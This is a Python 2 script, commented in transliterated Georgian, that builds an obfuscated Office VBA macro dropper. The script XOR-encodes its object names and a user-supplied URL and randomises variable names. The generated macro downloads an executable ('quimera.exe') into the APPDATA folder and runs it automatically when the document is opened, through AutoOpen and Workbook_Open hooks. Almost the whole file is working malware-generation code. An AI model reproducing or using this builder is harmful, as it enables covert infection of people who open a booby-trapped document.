
import string # imisatvis rom davbewdot winaswar yvela patara da didi aso da aseve cifrebi
import random # shemtxveviti amorchevistvis
import re # imistvis rom gavigot stringi iwyeba tu ara cifrit
from itertools import cycle # izip tuple formatshi gadasayvanat, cycle indexsaciis tavidan atvla sanam cikli ar damtavrdeba. es gvexmareba rom gasagebi iyos teqstze patara


def randomKey(length): # gadaecema gasagebis zoma
	'''
	agenerirebs shemtxvevit gasagebs romelic sheicavs patara da did asos aseve simboloebsa da cifrebs
	'''
	return ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(length))
	
	
def randStr(length): #gadaeceme shemtxveviti stringis zoma
	'''
	abrunebs shemtxvevit strings romelic shicavs patara da did asoebs da cifrebs (ar sheicavs simboloebs randomKey -s gan gansxvavebit)
	'''
	return ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(length))
	
def random_vars(n=10, length=20): 
    i = 0
    retlist = [] # listi sadac inaxeba shemtxvevit generirebui cvladis saxelebi
    while i < n: # while bloki imishavebs sanam xvela shemtxveviti cvladi ar dageneirdeba.
        mylen = random.randint(length / 2, length) # cvladis shemtxveviti zom 10 dan 20 mde
        s = randStr(mylen) # shemtxveviti str generireba romlis zoma iqneba 10 dan 20 mde
        if not re.match('^[0-9].+', s): # movaxdinot shemtxveviti stingis shemowmeba rom mas qondes cvladis saxe da ar icyebodes cifrebit. tu ar iwyeba cifrit mashin
            retlist.append(s) # shedegis siashi damateba
            i += 1 # agnishvna rom erti cvladi mzadaa
    return retlist # siis dabruneba

	
def vbs_xor(data, key='default', maxlen=40):
    xored = ''.join(chr(ord(x) ^ ord(y)) for (x, y) in zip(data, cycle(key)))
    i = 1 # atvla iwyebodes 1 dan
    out = '' # incapsulaciistvis chveni shedegebis
    for c in xored: # tito qereteri roelic aris ukve XOR -i
        if (i % maxlen) == 0: # yovel me-40 ciklze amushavdeba kodi
            out += ' _\r' # chvens out -s vuketeb "_" radgan macros-shi stringis sigrdze 40 ar unda agematebodes
        out += 'Chr(%d)&' % (ord(c)) # Chr -is konfiguracia
        i += 1 # gasda xovel itereciaze
    return out[:-1] # minus erti imitom rom bolos '&' simbolo ar kondes
    
    
    
    
    
    
def create_vbs_file(url, randomize=True):
	
	
	rv = random_vars(25)
   
	if randomize:
		key1 = randStr(64)
		key2 = randStr(64)
		key3 = randStr(64)
		key4 = randStr(64)
		key5 = randStr(64)
		h = rv.pop()
		m = rv.pop()		
		wshobj = rv.pop()
		oShell = rv.pop()
		strH = rv.pop()
		sDir = rv.pop()
		fso = rv.pop()
		FileSystemObject = rv.pop()
		oFSO = rv.pop()
		bStrm = rv.pop()
		xHttp = rv.pop()
		#
		str11 = rv.pop()
		f = rv.pop()
		fc = rv.pop()
		f1 = rv.pop()
		strF = rv.pop()
		intFiles = rv.pop()
		WshShell = rv.pop()
		fR = rv.pop()
		#
		XOREnc = rv.pop()
		inString = rv.pop()
		pw = rv.pop()
		L = rv.pop()
		X = rv.pop()
		C = rv.pop()
	else:
		key1 = 'KEY1_AAAA'
		key2 = 'KEY2_BBBB'
		key3 = 'KEY2_CCCC'
		key4 = 'KEY2_DDDD'
		key5 = 'KEY2_EEEE'
		h = "h"
		m = "m"		
		wshobj = "wshobj"
		oShell = "oShell"
		strH = "strH"
		sDir = "sDir"
		fso = "fso"
		FileSystemObject = "FileSystemObject"
		oFSO = "oFSO"
		bStrm = "bStrm"
		xHttp = "xHttp"
		#
		str11 = "str11"
		f = "f"
		fc = "fc"
		f1 = "f1"
		strF = "strF"
		intFiles = "intFiles"
		WshShell = "WshShell"
		fR = 'fR'
		#
		XOREnc = "XOREnc"
		inString = "inString"
		pw = "pw"
		L = "L"
		X = "X"
		C = "C"
    
	
	xor_wscript = vbs_xor('Wscript.Shell', key1)
	xor_APPDATA = vbs_xor('%APPDATA%', key2)
	xor_FileSystemObject = vbs_xor("Scripting.FileSystemObject", key3)
	xor_Stream = vbs_xor("Adodb.Stream", key4)
	xor_XMLHTTP = vbs_xor("Microsoft.XMLHTTP", key5)
	xor_link = vbs_xor(url, key1)
	
   
	
	vba = """\
Sub %s()\r
	Set %s = CreateObject(%s(%s,\"%s\"))\r
	%s = %s.ExpandEnvironmentStrings(%s(%s,\"%s\"))\r
	Dim %s: %s = %s & "\q"\r
	\r
	Set %s = CreateObject(%s(%s,\"%s\"))\r
		If (%s.FolderExists(%s)) Then\r
			
		Else\r
		Set %s = CreateObject(%s(%s,\"%s\"))\r
			%s.CreateFolder %s\r
	End If\r
	\r
	Dim %s: Set %s = CreateObject(%s(%s,\"%s\"))\r
	Dim %s: Set %s = CreateObject(%s(%s,\"%s\"))\r
	%s.Open "GET", %s(%s,\"%s\"), False\r
	%s.Send\r
	\r
	With %s\r
		.Type = 1\r
		.Open\r
		.write %s.responseBody\r
		.savetofile %s & "\q\quimera.exe", 2\r
	End With\r
	\r
	Call %s(%s)\r
	\r
End Sub\r
Sub AutoOpen(): %s: End Sub\r
Sub Auto_Open(): %s: End Sub\r
Sub Workbook_Open(): %s: End Sub\r
\r

Function %s(%s)\r
	Dim %s, %s, %s, %s, %s, %s\r
	Dim %s\r
	\r
	Set %s = CreateObject(%s(%s,\"%s\"))\r
	\r	
	%s = ""\r
	\r
	Set %s = CreateObject(%s(%s,\"%s\"))\r
	If (%s.FolderExists(%s)) Then\r
		Set %s = %s.GetFolder(%s)\r
		Set %s = %s.Files\r
		\r
		For Each %s In %s\r
		Dim %s\r
		%s = %s & "\\" & %s.Name\r
		%s.Run Chr(34) & %s & Chr(34), 1, True\r
	Next\r
		\r
		Set %s = Nothing\r
		Set %s = Nothing\r
		Set %s = Nothing\r
		\r
	End If\r
Set %s = Nothing\r
End Function\r
\r
Private Function %s(ByVal %s As String, ByVal %s As String) As String\r
	Dim %s As Integer: Dim %s As Integer: Dim %s As String\r
	%s = Len(%s$)\r
	For %s = 1 To Len(%s)\r
		%s = Asc(Mid$(%s$, (%s Mod %s) - %s * ((%s Mod %s) = 0), 1))\r
		Mid$(%s, %s, 1) = Chr$(Asc(Mid$(%s, %s, 1)) Xor %s)\r
	Next\r
	%s = %s\r
End Function\r
"""	% \
		(
			h,
			oShell, XOREnc, xor_wscript, key1,
			strH, oShell, XOREnc, xor_APPDATA, key2,
			sDir, sDir, strH,
			fso, XOREnc, xor_FileSystemObject, key3,
			fso, sDir,
			oFSO, XOREnc, xor_FileSystemObject, key3,
			oFSO, sDir,
			bStrm, bStrm, XOREnc, xor_Stream, key4,
			xHttp, xHttp, XOREnc, xor_XMLHTTP, key5,
			xHttp, XOREnc, xor_link, key1,
			xHttp,
			bStrm,
			xHttp,
			strH,
			m,sDir,
			h,
			h,
			h,
			#
			m,str11,
			fso, f, fc, f1, strF, intFiles,
			WshShell,
			WshShell, XOREnc, xor_wscript, key1,
			strF,
			fso, XOREnc, xor_FileSystemObject, key3,
			fso, str11,
			f, fso, str11,
			fc, f,
			f1, fc,
			fR,
			fR, str11, f1,
			WshShell, fR,
			f1,
			fc,
			f,
			fso,
			#
			XOREnc, inString, pw,
			L, X, C,
			L, pw,
			X, inString,
			C, pw, X, L, L, X, L,
			inString, X, inString, X, C,
			XOREnc, inString
		)
	
	# write vbs file
	#print(vba)
	
	try:
		f = open('%s.txt' % 'macros', 'w')
		f.write(vba)
		f.close()
	except:
		raise
	
    
url = raw_input('url: ')   
try:
	create_vbs_file(url=url)
	print '\n\n\t\t\tmacros.txt sheiqmna warmatebit'
except:
	pass
